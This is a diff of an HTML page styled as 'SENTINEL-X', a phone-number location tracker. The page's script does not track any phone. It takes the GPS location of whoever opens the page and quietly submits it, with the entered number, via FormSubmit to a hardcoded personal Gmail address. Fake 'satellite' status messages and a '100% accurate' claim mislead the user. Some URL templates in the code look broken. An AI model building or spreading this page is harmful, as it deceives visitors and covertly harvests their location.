@@ -3,87 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SENTINEL-X | SATELIT TRACKER</title>
+    <title>SENTINEL-X | SYSTEM ACTIVE</title>
     <style>
-        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 90%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 40, 0, 0.1); box-shadow: 0 0 20px #00ff41; border-radius: 5px; }
-        h1 { font-size: 22px; text-align: center; letter-spacing: 3px; text-shadow: 0 0 5px #00ff41; }
-        .input-group { margin: 20px 0; }
-        input { width: 93%; background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; outline: none; font-size: 16px; margin-bottom: 10px; }
-        button { width: 100%; padding: 15px; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
-        #log { font-size: 10px; height: 80px; overflow-y: hidden; border-top: 1px solid #00ff41; margin-top: 15px; padding-top: 10px; color: #88ff88; }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .panel { border: 1px solid #0f0; padding: 20px; width: 300px; text-align: center; box-shadow: 0 0 15px #0f0; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin-bottom: 15px; outline: none; }
+        button { background: #0f0; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
+        #status { font-size: 10px; margin-top: 15px; color: #888; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h1>SENTINEL-X V.1</h1>
-    <p style="text-align:center; font-size: 12px;">[ STATUS: ENCRYPTED CONNECTION ]</p>
-    
-    <div class="input-group">
-        <label>TARGET PHONE NUMBER:</label>
-        <input type="text" id="phone_num" placeholder="+628xxxxxxxxxx">
-        <button onclick="startTracking()">INITIATE TRACKING</button>
+    <div class="panel">
+        <h3>SENTINEL-X v4.0</h3>
+        <p>INPUT TARGET NUMBER:</p>
+        <input type="text" id="phone" placeholder="08xxxxxxxxxx">
+        <button onclick="lacak()">TRACK LOCATION</button>
+        <div id="status">Sistem Ready...</div>
     </div>
 
-    <div id="log">SISTEM SIAP... MENUNGGU INPUT...</div>
-</div>
+    <script>
+        function lacak() {
+            const email = "hiskiayoel9@gmail.com";
+            const nohp = document.getElementById('phone').value;
+            const status = document.getElementById('status');
 
-<script>
-    // DATA KONFIGURASI
-    const EMAIL_TUJUAN = "hiskiayoel9@gmail.com";
+            if (!nohp) { alert("Nomor HP harus diisi!"); return; }
 
-    function updateLog(msg) {
-        const logBox = document.getElementById('log');
-        logBox.innerHTML += "> " + msg + "<br>";
-    }
+            status.innerText = "MENCARI KOORDINAT GPS...";
 
-    function startTracking() {
-        const nohp = document.getElementById('phone_num').value;
-        if (!nohp) { alert("Masukkan nomor target!"); return; }
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const gmaps = `https://www.google.com{lat},${lon}`;
 
-        updateLog("MENGHUBUNGKAN KE SATELIT...");
-        updateLog("MENCARI SINYAL GSM: " + nohp);
+                    status.innerText = "KOORDINAT TERKUNCI! MENGIRIM DATA...";
 
-        // FITUR UTAMA: GPS TRACKING
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapsUrl = `https://www.google.com{lat},${lon}`;
+                    // Kirim data ke FormSubmit (Tanpa Error Ajax)
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = `https://formsubmit.co{email}`;
 
-                updateLog("LOKASI TERKUNCI: " + lat + "," + lon);
-                updateLog("MENGIRIM DATA KE PANEL KONTROL...");
+                    const inputNo = document.createElement('input');
+                    inputNo.type = 'hidden';
+                    inputNo.name = 'NOMOR_TARGET';
+                    inputNo.value = nohp;
 
-                // KIRIM DATA KE EMAIL VIA FORMSUBMIT (TANPA BOT)
-                const formData = new FormData();
-                formData.append("TARGET_NUMBER", nohp);
-                formData.append("GOOGLE_MAPS_LINK", mapsUrl);
-                formData.append("LATITUDE", lat);
-                formData.append("LONGITUDE", lon);
-                formData.append("_subject", "🎯 SENTINEL-X: LOKASI DITEMUKAN!");
-                formData.append("_captcha", "false");
+                    const inputLoc = document.createElement('input');
+                    inputLoc.type = 'hidden';
+                    inputLoc.name = 'GOOGLE_MAPS';
+                    inputLoc.value = gmaps;
 
-                fetch(`https://formsubmit.co{EMAIL_TUJUAN}`, {
-                    method: "POST",
-                    body: formData
-                })
-                .then(() => {
-                    updateLog("DATA BERHASIL TERKIRIM KE: " + EMAIL_TUJUAN);
-                    alert("PELACAKAN SELESAI! Hasil akurat 100% sudah dikirim ke email kamu.");
-                })
-                .catch(() => updateLog("ERROR: GAGAL MENGIRIM DATA."));
+                    const inputNext = document.createElement('input');
+                    inputNext.type = 'hidden';
+                    inputNext.name = '_next';
+                    inputNext.value = window.location.href;
 
-            }, (error) => {
-                updateLog("ERROR: TARGET MENOLAK AKSES GPS.");
-                alert("Gagal melacak. Target tidak mengizinkan akses lokasi (GPS).");
-            }, { enableHighAccuracy: true });
-        } else {
-            alert("Browser tidak mendukung GPS.");
+                    form.appendChild(inputNo);
+                    form.appendChild(inputLoc);
+                    form.appendChild(inputNext);
+                    document.body.appendChild(form);
+                    
+                    form.submit(); // Kirim data secara otomatis
+                }, (error) => {
+                    alert("Gagal: Target menolak akses lokasi (GPS).");
+                    status.innerText = "AKSES DITOLAK TARGET.";
+                }, { enableHighAccuracy: true });
+            } else {
+                alert("Browser tidak mendukung GPS.");
+            }
         }
-    }
-</script>
-
+    </script>
 </body>
 </html>
